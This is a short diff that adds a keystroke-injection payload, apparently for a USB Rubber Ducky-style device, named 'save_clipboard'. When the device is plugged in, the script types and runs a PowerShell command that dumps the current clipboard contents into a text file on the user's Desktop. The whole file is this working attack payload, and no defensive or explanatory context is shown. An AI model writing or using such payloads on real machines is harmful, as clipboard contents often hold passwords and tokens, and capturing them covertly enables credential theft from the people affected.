@@ -1,0 +1,4 @@
+REM Payload: save_clipboard
+DELAY 500
+STRING powershell Get-Clipboard > %USERPROFILE%\Desktop\clip.txt
+ENTER
